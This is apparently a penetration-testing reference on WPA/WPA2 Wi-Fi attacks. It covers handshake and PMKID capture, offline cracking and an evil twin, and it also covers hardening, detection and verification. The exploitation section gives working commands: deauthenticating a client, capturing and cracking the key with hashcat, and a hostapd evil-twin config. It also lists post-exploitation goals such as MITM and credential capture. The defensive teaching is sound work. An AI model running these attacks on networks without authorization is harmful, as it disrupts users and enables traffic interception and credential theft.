# WPA/WPA2 Attacks

Attacks against WPA and WPA2 networks: capturing the 4-way handshake,
PMKID-based attacks, offline cracking, deauthentication for forced
reconnection, and evil twin with a captured PSK. Also covers WPA
(TKIP) where still present, and the transition to WPA3.

> [!CAUTION]
> Deauthentication and evil twin attacks are disruptive. They
> disconnect real users and may cause data loss. Only run these
> against networks you own or have written authorization to test.

---

## 1. Overview

WPA2-Personal (PSK) uses a **pre-shared key** plus a **4-way
handshake** to derive session keys. The handshake does not reveal the
PSK directly, but it contains enough material for an offline
dictionary attack: if the passphrase is weak, it can be recovered.

WPA (TKIP) is the older version, deprecated and broken (TKIP has
known cryptographic weaknesses). WPA2 (CCMP) is the standard.

WPA3-Personal replaces PSK with **SAE (Simultaneous Authentication
of Equals)**, a password-authenticated key exchange that defeats the
offline dictionary attack. WPA3-SAE is covered in file 04.

Two capture methods for WPA2:

- **4-way handshake** - requires a client to connect (or reconnect)
  while the attacker is capturing. Can be forced with a deauth.
- **PMKID** - captured directly from the AP, no client needed. Faster
  and stealthier. Supported by many modern APs.

Once captured, the material is cracked offline with hashcat or
aircrack-ng.

---

## 2. Reconnaissance / Enumeration

### 2.1 Identify WPA2-PSK vs WPA2-Enterprise

From `airodump-ng` (see file 02):

```text
BSSID              PWR  CH  ENC   CIPHER  AUTH  ESSID
12:34:56:78:9A:BC  -45   6  WPA2  CCMP    PSK   CorpWiFi
12:34:56:78:9A:BD  -67   1  WPA2  CCMP    802.1X Corp-Enterprise
```

`PSK` = WPA2-Personal, target of this file.
`802.1X` = WPA2-Enterprise, target of file 05.

### 2.2 Identify WPA vs WPA2

```text
ENC   CIPHER  AUTH
WPA   TKIP    PSK       <- WPA (deprecated)
WPA2  CCMP    PSK       <- WPA2 (standard)
WPA2  CCMP    802.1X    <- WPA2-Enterprise
WPA3  CCMP    SAE       <- WPA3-Personal
```

WPA (TKIP) is vulnerable to additional attacks (chopchop, Beck-Tews)
but the 4-way handshake capture + crack workflow is the same.

### 2.3 Identify PMKID support

Not all APs support PMKID. Test with `hcxdumptool`:

```bash
sudo hcxdumptool -i wlan0 -o pmkid-test.pcapng --enable_status=1
```

If the AP sends a PMKID in the RSN information element, hcxdumptool
captures it. If nothing appears in 5 minutes, the AP does not support
PMKID; use the 4-way handshake.

### 2.4 Identify client to deauth

From `airodump-ng` client list (file 02):

```text
BSSID              STATION            PWR  Rate
12:34:56:78:9A:BC  AA:11:BB:22:CC:33  -50  54-54
12:34:56:78:9A:BC  DD:44:EE:55:FF:66  -60  48-48
```

Choose a client with strong signal (PWR close to 0). Weak-signal
clients may not reconnect quickly after deauth.

---

## 3. Common Attack Vectors

### 3.1 4-way handshake capture (passive)

Capture the handshake when a client connects. No interaction with the
target. Requires patience: wait for a client to connect, or trigger
a reconnection.

**Precondition:** a client must associate during the capture window.

### 3.2 4-way handshake capture (active, deauth)

Send a deauth frame to a connected client, forcing it to reconnect.
The reconnect produces a new handshake, which is captured. Fast and
reliable.

**Impact:** brief disconnection for the target client. Loud: any WIPS
sees the deauth.

### 3.3 PMKID capture (clientless)

Some APs send the PMKID in the first EAPOL message when the client
roams or reconnects. hcxdumptool can request it directly without a
client. Faster and quieter than deauth.

**Precondition:** AP supports PMKID (most modern APs do).

### 3.4 Offline cracking

Once the handshake or PMKID is captured, crack it offline:

- **Dictionary attack:** try each word in a wordlist.
- **Rule-based attack:** apply mutations (append digits, capitalize).
- **Mask attack:** if the passphrase pattern is known (e.g. 8 digits).
- **Hybrid:** wordlist + mask.

GPUs crack orders of magnitude faster than CPUs. A weak passphrase
cracks in seconds; a strong one is infeasible.

### 3.5 Evil twin with known PSK

If the PSK is known (from a previous capture), set up an evil twin AP
with the same SSID and PSK. Clients connect to the attacker's AP
(stronger signal), and the attacker sees all traffic.

**Alternatively:** relay the authentication to a real AP (with the
known PSK) and proxy traffic. This is a full MITM.

### 3.6 WPA (TKIP) specific attacks

- **Chopchop:** decrypt a packet without knowing the key by
  manipulating the MIC.
- **Beck-Tews:** inject packets into the WPA stream.

These are rarely needed in 2026 - WPA is deprecated. The 4-way
handshake capture is the primary attack.

### 3.7 KRACK (Key Reinstallation Attack)

Manipulate the 4-way handshake to reinstall a key the client already
knows. Breaks confidentiality and integrity of WPA2 traffic.

**Patched in 2017.** Only relevant for unpatched IoT/embedded devices.

---

## 4. Exploitation Recipes

### 4.1 Capture 4-way handshake (airodump-ng + aireplay-ng)

```bash
# Terminal 1: capture on the target channel, targeted BSSID
sudo airodump-ng -c 6 --bssid 12:34:56:78:9A:BC -w handshake wlan0

# Terminal 2: deauth a client to force reconnection
sudo aireplay-ng --deauth 10 -a 12:34:56:78:9A:BC \
    -c AA:11:BB:22:CC:33 wlan0
```

Expected output (terminal 1, top-right):

```text
CH  6 ][ Elapsed: 30 s ][ 2026-10-14 15:22
BSSID              PWR  Beacons  #Data  CH  ENC   CIPHER  AUTH
12:34:56:78:9A:BC  -45      120    340   6  WPA2  CCMP    PSK
                                      WPA handshake: 12:34:56:78:9A:BC
```

The `WPA handshake: <BSSID>` line confirms the capture.

### 4.2 Capture PMKID with hcxdumptool

```bash
# Capture PMKID from APs in range
sudo hcxdumptool -i wlan0 -o pmkid.pcapng --enable_status=1

# Convert to hashcat format (mode 22000)
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
```

Expected output (hcxdumptool):

```text
12:34:56:78:9A:BC  PMKID: captured
[15:25:03] PMKID(s) captured: 1
```

### 4.3 Crack with hashcat (mode 22000)

```bash
# Modern format (hc22000 covers both PMKID and handshake)
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt

# With rules for mutations
hashcat -m 22000 pmkid.hc22000 rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule

# Mask attack (8 digits)
hashcat -m 22000 pmkid.hc22000 -a 3 ?d?d?d?d?d?d?d?d
```

Expected output (found):

```text
pmkid.hc22000:Summer2026!
Session..........: hashcat
Status...........: Cracked
```

### 4.4 Crack with aircrack-ng (legacy)

```bash
# Convert the handshake
aircrack-ng handshake-01.cap

# Crack
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap
```

aircrack-ng is slower than hashcat but simpler. Use hashcat for
serious cracking.

### 4.5 Verify the handshake

```bash
# Check the cap file contains a valid handshake
aircrack-ng handshake-01.cap
# Output should show: "1 handshake(s) found" for the target BSSID
```

### 4.6 Evil twin with known PSK

```bash
# hostapd.conf for the evil twin
cat > /etc/hostapd/evil.conf <<'EOF'
interface=wlan0
driver=nl80211
ssid=CorpWiFi
channel=6
hw_mode=g
wpa=2
wpa_passphrase=Summer2026!
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

sudo hostapd /etc/hostapd/evil.conf
```

Clients using the same SSID and PSK will connect to whichever AP has
the stronger signal. Place the evil twin closer to the target for a
reliable capture.

---

## 5. Post-Exploitation

After cracking WPA2-PSK:

- **Full network access.** The PSK lets you join the network as a
  normal client.
- **Layer 2 attacks.** Once associated, ARP spoofing, DNS/DHCP, and
  pivoting all apply (file 05).
- **Lateral movement.** Access to internal resources the wireless
  network can reach.
- **PSK reuse.** Check if the same passphrase is used elsewhere
  (guest Wi-Fi at another site, IoT devices).

After capturing a handshake but not cracking it:

- **Save it.** Future wordlists or better GPU may crack it.
- **Do not delete.** The capture is valuable intelligence.

After establishing an evil twin:

- **Capture credentials** from clients using the network (HTTP,
  captive portal, NTLM).
- **MITM all traffic** (see ARP spoofing, file 05).
- **Serve malicious payloads** (captive portal with file downloads).

---

## 6. Risk Context (AppSec)

| Factor | Value |
|--------|-------|
| Typical severity | High (weak PSK) to Medium (strong PSK) |
| Preconditions | Attacker in radio range, handshake/PMKID captured |
| Detectability | Medium - deauth is loud, PMKID is quiet |
| Business impact | Network access, credential theft, lateral movement |

The security of WPA2-PSK depends entirely on passphrase strength.
A 20-character random passphrase is infeasible to crack; "Summer2026!"
cracks in seconds.

---

## 7. Root Causes (AppSec)

- WPA2-PSK is offline-crackable if the passphrase is weak.
- Deauthentication frames are unauthenticated (no PMF in WPA2).
- PMKID exposes a crackable value without a client.
- Users choose weak, memorable passphrases.
- PSK is shared across all clients, so one leak compromises everyone.
- WPA (TKIP) is deprecated but still deployed on legacy hardware.

---

## 8. Preventive Controls (AppSec)

### 8.1 Migrate to WPA3-SAE

WPA3 eliminates offline cracking. See file 04 for details.

```text
# hostapd.conf for WPA3-SAE
wpa=2
wpa_key_mgmt=SAE
ieee80211w=2
sae_password=<STRONG_PASSPHRASE>
```

### 8.2 Use strong passphrases

```text
# Minimum: 20+ random characters, or a 5+ word Diceware passphrase
# Example: "correct horse battery staple 7" (do not use this exact one)
```

A strong passphrase does not prevent handshake capture, but makes the
offline crack infeasible. This is the single most effective control
for WPA2-PSK.

### 8.3 Enable Protected Management Frames (PMF)

```text
# hostapd.conf
ieee80211w=2
```

PMF makes deauth frames authenticated, so the "deauth to force
handshake" attack fails. The attacker must wait passively for a
client to connect.

### 8.4 Disable WPA (TKIP)

```text
# hostapd.conf - only allow CCMP
wpa_pairwise=CCMP
rsn_pairwise=CCMP
# Do NOT include TKIP
```

### 8.5 Disable PMKID if not needed

```text
# hostapd.conf - some APs allow disabling PMKID caching
disable_pmksa_caching=1
```

Not all APs support this. Check vendor documentation.

### 8.6 Isolate wireless clients

- Use client isolation where possible.
- Segment the wireless VLAN from the wired network.
- Use a captive portal for guest networks.

### 8.7 Monitor for deauth storms

A WIPS detects deauth frames and alerts. This catches the active
handshake capture in real time.

---

## 9. Detection Controls (AppSec)

### 9.1 Deauth storm detection

- Multiple deauth frames in a short window.
- Deauth frames from a MAC that is not the AP's BSSID (spoofed).
- Deauth frames to a single client (targeted attack).

WIPS rule example (conceptual):

```text
if count(deauth_frames per (src, dst, channel), 10 sec) > 20:
    alert("deauth storm")
```

### 9.2 PMKID capture detection

PMKID capture is passive from the attacker's perspective. The AP does
not log it specially. Detection requires monitoring for unusual
association patterns.

### 9.3 Evil twin detection

- Same SSID broadcast by two different BSSIDs (one not in the
  authorized inventory).
- Signal strength anomaly (same SSID, different location).
- Client connecting to a BSSID with a suspicious vendor OUI.

### 9.4 Offline cracking detection (indirect)

Not detectable by the network. The crack happens on the attacker's
hardware. Prevention (strong passphrase) is the only control.

### 9.5 SIEM rules

- Alert on deauth storms (> N frames in 10 seconds).
- Alert on a new BSSID with an authorized SSID.
- Alert on clients connecting to BSSIDs not in the authorized list.

---

## 10. Verification (AppSec)

Test the controls after deployment:

1. **Strong PSK:** attempt a capture + crack with rockyou.txt. If
   the passphrase is 20+ random characters, the crack should fail.
2. **PMF:** run `aireplay-ng --deauth` against a WPA3 client. The
   client should not disconnect.
3. **WPA (TKIP) disabled:** check beacon information elements.
   Only CCMP should appear.
4. **PMKID disabled:** run hcxdumptool for 10 minutes. If the AP does
   not support PMKID, nothing should be captured.
5. **Client isolation:** from a wireless client, try to reach another
   wireless client. Should be blocked.

---

## 11. OSCP Notes

WPA2 cracking is **not** in the OSCP exam. It is relevant for:

- Real internal engagements where physical proximity is available.
- PEN-210 (OSCP+) covers wireless.
- Red team operations with physical access.

For the report, document:

- The capture method (handshake vs PMKID).
- The cracking tool and wordlist/rules used.
- The recovered passphrase and how it was used.
- The defensive control (strong PSK, WPA3, PMF).

---

## 12. Production Notes

- **Deauth attacks are disruptive.** The target client loses
  connectivity for a few seconds. Do not run during a critical
  operation.
- **Hashcat needs a GPU.** CPU cracking is 100x slower. Use a
  dedicated GPU or cloud GPU (e.g. vast.ai, AWS GPU instances).
- **rockyou.txt is not enough.** Modern passphrases often require
  custom rules or targeted wordlists (company name + year, etc.).
- **PMKID is faster than handshake.** Always try PMKID first; if the
  AP does not support it, fall back to the 4-way handshake.
- **Evil twin requires more setup than the handshake attack.** Use
  it only when the PSK is already known (from a previous capture) or
  when you need persistent MITM.
- **Do not store captures unencrypted.** A cap file with a handshake
  is sensitive material. Encrypt and delete after the engagement.

---

## 13. References

- Aircrack-ng suite - https://www.aircrack-ng.org/ - airodump-ng,
  aireplay-ng, aircrack-ng
- hcxdumptool - https://github.com/ZerBea/hcxdumptool - PMKID capture
- hcxtools - https://github.com/ZerBea/hcxtools - conversion and
  handshake tools
- hashcat - https://hashcat.net/hashcat/ - mode 22000 (PMKID/handshake)
- WPA3 Specification (Wi-Fi Alliance) - https://www.wi-fi.org/discover-wi-fi/security
- MITRE ATT&CK T1557 - Adversary-in-the-Middle - https://attack.mitre.org/techniques/T1557/
- MITRE ATT&CK T1040 - Network Sniffing - https://attack.mitre.org/techniques/T1040/
- IEEE 802.11i-2004 - Medium Access Control Security Enhancements
- NIST SP 800-153 - Guidelines for Securing Wireless Local Area Networks
- Kali Linux documentation - Wireless Attacks
- `man aircrack-ng`, `man hcxdumptool`, `man hashcat`
